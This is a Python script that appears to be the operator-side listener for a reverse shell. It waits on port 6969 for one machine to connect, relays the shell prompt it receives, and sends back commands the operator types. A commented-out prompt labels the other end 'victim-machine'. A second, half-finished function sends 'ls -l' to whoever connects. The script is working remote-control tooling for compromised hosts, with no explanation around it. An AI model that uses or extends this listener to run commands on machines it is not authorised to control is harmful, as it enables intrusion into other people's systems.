from time       import sleep
from signal     import signal, SIGINT
from threading  import Thread, currentThread
from builtins   import print as builtin_print

# Globals
g_server                  = None
g_client                  = None
g_connection_established  = False
g_was_signal_caught       = False
g_thread_print_names      = dict()


# Override to prefix user-defined thread name
def print(*args, **kwargs):
    global g_thread_print_names

    id = currentThread().ident
    prefix = g_thread_print_names.get(id)
    
    if prefix is not None:
        args = (prefix, *args)

    builtin_print(*args, **kwargs)

def signal_handler(signum, _frame):
    global g_server, g_was_signal_caught

    g_was_signal_caught = True
    print('-=-=- Caught signal %d -=-=-' % signum)
    return

def set_thread_print_name(name: str = None):
    global g_thread_print_names

    id = currentThread().ident

    if name is None or len(name) == 0:
        g_thread_print_names.pop(id, None)
    else:
        g_thread_print_names[id] = f'[{name}]'




from nclib import TCPServer

def close_server():
    global g_server

    if g_server is not None:
        if not g_server.closed:
            g_server.sock.close()
            g_server.close()

def on_accept_callback(did_succeed: bool):
    global g_client, g_connection_established

    g_connection_established = did_succeed
    if did_succeed:
        print('Connected to %s:%d' % g_client.peer)

def async_accept(ip: str, port: int, callback):
    global g_server, g_client, g_connection_established

    set_thread_print_name('TCP Server')

    host = (ip, port)
    g_server = TCPServer(host)
    print('Listening on %s:%d' % host)

    # Wait for a single connection.
    status = False
    try:
        for _client in g_server:
            g_client = _client
            break
        status = True
    except Exception as e:
        print('ERROR: Failed to make connection:\n\t', e)
    
    # Hit callback.
    callback(status)
    return

def listener(ip: str, port: int):
    global g_server, g_client, g_connection_established, g_was_signal_caught

    # Start TCP server on a new thread.
    t = Thread(target=async_accept, args=(ip, port, on_accept_callback))
    t.start()
    
    # Wait for a connection or ctrl+c interrupt.
    while not g_connection_established:
        if g_was_signal_caught:
            print('Interrupted before a connection request was received.')
            break

        # No need to belligerent.
        sleep(0.2)

    # Are we connected?
    if g_connection_established:
        command = ''
        while command != 'exit':
            # Exit the loop if the g_server was closed.
            if g_server is None or g_server.closed:
                print('Server closed unexpectedly.')
                break
            
            # uwu
            try:
                # get output until dollar sign (bash --posix forces bash-X.X$)
                data = g_client.read_until('$')
                # data = g_client.read_until('#')
                # data = g_client.read(4096, 1.0)
                # data = g_client.interact()
                print(data.decode('utf-8'), end='')  # print string of received bytes
    
                # get user input command and write command to socket
                # command = input('victim-machine> ')
                command = input(' ')
                g_client.writeln(command)
    
            except KeyboardInterrupt:
                print('Keyboard Interrupt')
                break
            
            except Exception as e:
                print('Unknown error:', e)
                break

        print('Disconnected.')

    # Make sure g_server is dead so we can wrangle it's corpse.
    close_server()
    t.join()
    return




import socket
import select
import struct

def getTCPInfo(s):
    '''struct tcp_info
    {
        u_int8_t	tcpi_state;
        u_int8_t	tcpi_ca_state;
        u_int8_t	tcpi_retransmits;
        u_int8_t	tcpi_probes;
        u_int8_t	tcpi_backoff;
        u_int8_t	tcpi_options;
        u_int8_t	tcpi_snd_wscale : 4, tcpi_rcv_wscale : 4;

        u_int32_t	tcpi_rto;
        u_int32_t	tcpi_ato;
        u_int32_t	tcpi_snd_mss;
        u_int32_t	tcpi_rcv_mss;

        u_int32_t	tcpi_unacked;
        u_int32_t	tcpi_sacked;
        u_int32_t	tcpi_lost;
        u_int32_t	tcpi_retrans;
        u_int32_t	tcpi_fackets;

        /* Times */
        u_int32_t	tcpi_last_data_sent;
        u_int32_t	tcpi_last_ack_sent;
        u_int32_t	tcpi_last_data_recv;
        u_int32_t	tcpi_last_ack_recv;

        /* Metrics */
        u_int32_t	tcpi_pmtu;
        u_int32_t	tcpi_rcv_ssthresh;
        u_int32_t	tcpi_rtt;
        u_int32_t	tcpi_rttvar;
        u_int32_t	tcpi_snd_ssthresh;
        u_int32_t	tcpi_snd_cwnd;
        u_int32_t	tcpi_advmss;
        u_int32_t	tcpi_reordering;
    };'''

    x = struct.unpack('B'*7+'I'*21, s.getsockopt(socket.SOL_TCP, socket.TCP_INFO, 1*7+4*21))
    print(x)

def netcat(hostname, port, content):
    host = (hostname, port)

    print('Creating socket')
    sock = socket.socket(type=socket.SOCK_STREAM)
    print('Setting options')
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print('Binding')
    sock.bind(host)
    print('Listening')
    sock.listen()

    # print('r/w pair')
    # _rsock, _wsock = socket.socketpair()
    #
    # print('select')
    # rl, _, _ = select.select([sock, _rsock], [], [])
    # if _rsock in rl:
    #     print('closing r/w')
    #     _rsock.close()
    #     _wsock.close()

    print('Waiting for connection...')
    client, addr = sock.accept()
    # yield Netcat(sock=client, server=addr)
    print('Connected to %s:%d' % addr)
    
    print('  - blocking =', client.getblocking())
    print('  - timeout  =', client.gettimeout())

    # print('Setting blocking to False')
    # client.setblocking(False)
    # print('  - blocking =', client.getblocking())
    # print('  - timeout  =', client.gettimeout())

    client.sendall(b'ls -l')


    data = b''
    while not g_was_signal_caught:
        try:
            recv = client.recv(1)
        except Exception as e:
            print('Exception:', e)
            break

        if recv == b'':
            print('Received all data')
            break
            
    print('data =', data)
    client.close()
    sock.close()





if __name__ == '__main__':
    signal(SIGINT, signal_handler)
    set_thread_print_name('Main')

    print('-=-=- Start -=-=-')
    
    set_thread_print_name()
    set_thread_print_name()
    set_thread_print_name()
    set_thread_print_name()
    listener('0.0.0.0', 6969)
    # netcat('0.0.0.0', 6969, None)
    set_thread_print_name('Main')
    
    print('-=-=- Done -=-=-')
